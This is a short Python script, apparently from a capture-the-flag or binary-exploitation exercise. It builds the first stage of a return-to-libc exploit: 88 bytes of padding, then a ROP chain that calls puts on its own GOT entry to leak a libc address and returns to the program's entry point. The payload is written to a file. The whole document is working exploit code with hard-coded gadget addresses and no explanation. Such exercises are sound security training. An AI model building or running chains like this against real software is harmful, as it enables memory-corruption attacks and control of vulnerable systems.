#!/usr/bin/env python3

from struct import pack

payload = b'a' * 88

# puts(<puts@GLIBC_2.2.5>);
payload += pack("<Q", 0x4028e3) # pop rdi ; ret
payload += pack("<Q", 0x405028) # <puts@GLIBC_2.2.5>
payload += pack("<Q", 0x401100) # <puts@plt>
payload += pack("<Q", 0x401190) # Entry point

with open("payload1", "wb") as f:
    f.write(payload)
